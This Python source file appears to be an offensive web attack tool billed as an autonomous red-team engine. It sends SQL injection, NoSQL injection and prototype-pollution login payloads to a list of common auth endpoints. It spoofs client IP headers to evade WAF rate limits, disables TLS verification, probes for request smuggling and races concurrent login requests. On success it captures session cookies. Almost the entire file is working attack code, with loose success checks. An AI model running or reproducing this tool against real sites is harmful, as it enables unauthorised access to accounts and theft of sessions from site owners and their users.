import asyncio
import socket
import ssl
import time
import sys
import json
import os
import urllib.parse
import http.client
import random

# Initialize strict non-verifying SSL context for target testing
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

def generate_spoofed_ip():
    """Generates random internal/trusted proxy IPs to bypass WAF rate-limiting."""
    return f"{random.randint(10, 192)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def verify_cryptographic_and_auth_proof(status, headers, body, target_endpoint):
    """
    Rigorously verifies whether an endpoint response represents a genuine 
    authentication bypass, database error, or valid session privilege escalation.
    """
    body_lower = body.lower()
    
    # 1. Database Error-Based Verification (SQLi / NoSQLi)
    sql_errors = [
        "sql syntax", "syntax error", "unclosed quotation mark", 
        "pg_query()", "sqlite3.operationalerror", "mysql_fetch", 
        "unterminated string literal", "ORA-00933", "mongodb", "postgresql",
        "syntaxerror: unexpected", "pdoexception"
    ]
    for err in sql_errors:
        if err in body_lower:
            return True, f"TRUE_EXPLOIT_SQL_ERROR_{err.upper()}"

    # 2. Stateful Session / Token Hijack Verification
    set_cookie = headers.get("Set-Cookie", "")
    has_session_cookie = any(cookie_key in set_cookie.lower() for cookie_key in ["session", "token", "jwt", "auth", "connect.sid", "access_token"])
    
    if status in [200, 201, 302] and (has_session_cookie or "bearer" in body_lower):
        auth_indicators = ["dashboard", "welcome", "admin_panel", "account_settings", "portfolio", "success", "token", "user"]
        if any(ind in body_lower for ind in auth_indicators) and "invalid" not in body_lower and "unauthorized" not in body_lower:
            return True, "TRUE_EXPLOIT_SESSION_HIJACK_CONFIRMED"

    # 3. Prototype Pollution / Header Poisoning Verification
    if status in [200, 302, 500] and ("polluted" in body_lower or "admin" in body_lower or "root privilege" in body_lower):
        return True, "TRUE_EXPLOIT_STATE_MANIPULATION"

    return False, "FALSE_POSITIVE_REJECTION"

def _perform_sync_request(host, port, path, payload, use_ssl, method="POST", smuggle_headers=None):
    """Synchronous transport worker with WAF evasion headers and request smuggling support."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=6.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=6.0)
        
        spoofed_ip = generate_spoofed_ip()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "X-Forwarded-For": spoofed_ip,
            "X-Originating-IP": spoofed_ip,
            "X-Remote-IP": spoofed_ip,
            "Client-IP": spoofed_ip,
            "Referer": f"https://{host}{path}",
            "Connection": "close"
        }
        
        if smuggle_headers:
            headers.update(smuggle_headers)
        
        data = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        conn.request(method, path, data.encode("utf-8"), headers)
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode(errors="ignore")
        headers_dict = dict(resp.getheaders())
        conn.close()
        return status, headers_dict, body, None
    except Exception as e:
        return 0, {}, "", str(e)

async def test_endpoint_differential_async(host, port, path, payload, use_ssl, smuggle_headers=None):
    """Non-blocking asynchronous wrapper with WAF bypass verification."""
    status, headers, body, err = await asyncio.to_thread(
        _perform_sync_request, host, port, path, payload, use_ssl, "POST", smuggle_headers
    )
    if err:
        return 0, {}, "", False, "TRANSPORT_ERROR"
    
    is_vuln, vuln_type = verify_cryptographic_and_auth_proof(status, headers, body, path)
    return status, headers, body, is_vuln, vuln_type

async def test_race_condition_async(host, port, path, payload, use_ssl, concurrency=10):
    """Fires concurrent parallel requests to exploit state validation & race conditions."""
    tasks = []
    for _ in range(concurrency):
        tasks.append(test_endpoint_differential_async(host, port, path, payload, use_ssl))
    
    results = await asyncio.gather(*tasks)
    for status, headers, body, is_vuln, vuln_type in results:
        if is_vuln:
            return status, headers, body, True, "TRUE_EXPLOIT_RACE_CONDITION_BYPASS"
    return 0, {}, "", False, "FALSE_POSITIVE_REJECTION"

async def run_autonomous_engine(target_host, credentials_list=None, options=None):
    """
    Elite Autonomous Red-Team Engine: WAF Bypass, IP Spoofing, Schema Mutation, 
    and Race Condition Exploitation with zero-lag live terminal streaming.
    """
    try:
        resolved_ip = socket.gethostbyname(target_host)
        sys.stdout.write(f"\n\033[96m[*] Resolving target domain: {target_host} -> {resolved_ip}\033[0m\n")
        sys.stdout.flush()
    except socket.gaierror:
        sys.stdout.write(f"\n\033[91m[!] Fatal: Target resolution failed for '{target_host}'.\033[0m\n")
        sys.stdout.flush()
        return [], 0

    start_time = time.time()
    sys.stdout.write(f"\n\033[95m[***] ENGAGING RUTHLESS OFFENSIVE ENGINE W/ WAF EVASION [{target_host}] [***]\033[0m\n")
    sys.stdout.flush()
    
    target_paths = [
        "/api/auth/callback/credentials",
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/v1/users/login",
        "/api/login",
        "/login",
        "/signin",
        "/auth",
        "/api/v1/auth"
    ]
    
    base_payloads = [
        ("admin' OR '1'='1' --", "x"),
        ("admin' --", "password"),
        ({"$ne": None}, {"$ne": None}), # NoSQL Injection
    ]
    
    payloads = []
    for u_val, p_val in base_payloads:
        for u_key in ["username", "email", "user", "login", "account"]:
            for p_key in ["password", "pass", "pwd", "secret"]:
                payloads.append({u_key: u_val, p_key: p_val})
                    
    payloads.append({"__proto__": {"isAdmin": True, "role": "admin"}, "username": "admin", "password": "x"})

    hits = []
    target_port = 443
    use_ssl = True

    sys.stdout.write(f"[*] Dispatched advanced payload permutations with dynamic IP rotation & header spoofing...\n")
    sys.stdout.flush()

    for path in target_paths:
        sys.stdout.write(f"\033[90m[*] Probing endpoint route: {path} ({len(payloads)} mutations)...\033[0m\n")
        sys.stdout.flush()
        
        # 1. Standard Multi-Vector Permutations with IP Spoofing
        for payload in payloads:
            status, headers, body, is_vuln, vuln_type = await test_endpoint_differential_async(
                resolved_ip, target_port, path, payload, use_ssl
            )
            
            if status in [200, 201, 302, 401, 403, 500]:
                sys.stdout.write(f"       └── [CODE {status}] Route: {path}\n")
                sys.stdout.flush()

            if is_vuln:
                hit_data = {
                    "type": vuln_type,
                    "endpoint": path,
                    "payload": payload,
                    "status": status,
                    "cookies": headers.get("Set-Cookie", ""),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE VERIFIED EXPLOIT CONFIRMED [***]\033[0m\n")
                sys.stdout.write(f"  ├── Type     : \033[92m{vuln_type}\033[0m\n")
                sys.stdout.write(f"  ├── Endpoint : {path}\n")
                sys.stdout.write(f"  ├── Status   : {status}\n")
                sys.stdout.write(f"  └── Cookies  : \033[92m{hit_data['cookies'][:40]}...\033[0m\n")
                sys.stdout.flush()
                
                hits.append(hit_data)
                return hits, time.time() - start_time

        # 2. HTTP Request Smuggling Anomaly Probe
        smuggle_vectors = [
            {"Transfer-Encoding": "chunked", "Content-Length": "4"},
            {"Content-Length": "0", "Transfer-Encoding": "chunked"}
        ]
        for s_header in smuggle_vectors:
            status, headers, body, is_vuln, vuln_type = await test_endpoint_differential_async(
                resolved_ip, target_port, path, {"user": "admin", "pass": "admin"}, use_ssl, smuggle_headers=s_header
            )
            if is_vuln:
                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE REQUEST SMUGGLING ANOMALY [***]\033[0m\n")
                sys.stdout.write(f"  ├── Endpoint : {path}\n")
                sys.stdout.write(f"  └── Status   : \033[92m{status}\033[0m\n")
                sys.stdout.flush()

        # 3. Race Condition State Stress Test
        r_status, r_headers, r_body, r_vuln, r_type = await test_race_condition_async(
            resolved_ip, target_port, path, {"username": "admin", "password": "password"}, use_ssl, concurrency=12
        )
        if r_vuln:
            hit_data = {
                "type": r_type,
                "endpoint": path,
                "status": r_status,
                "timestamp": time.strftime("%Y-%m-d %H:%M:%S")
            }
            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE RACE CONDITION EXPLOIT CONFIRMED [***]\033[0m\n")
            sys.stdout.write(f"  ├── Endpoint : {path}\n")
            sys.stdout.write(f"  └── Status   : \033[92m{r_status}\033[0m\n")
            sys.stdout.flush()
            
            hits.append(hit_data)
            return hits, time.time() - start_time

    duration = time.time() - start_time
    sys.stdout.write(f"\n\033[33m[*] Autonomous validation concluded in {duration:.2f}s. Perimeter verified.\033[0m\n\n")
    sys.stdout.flush()
    return hits, duration
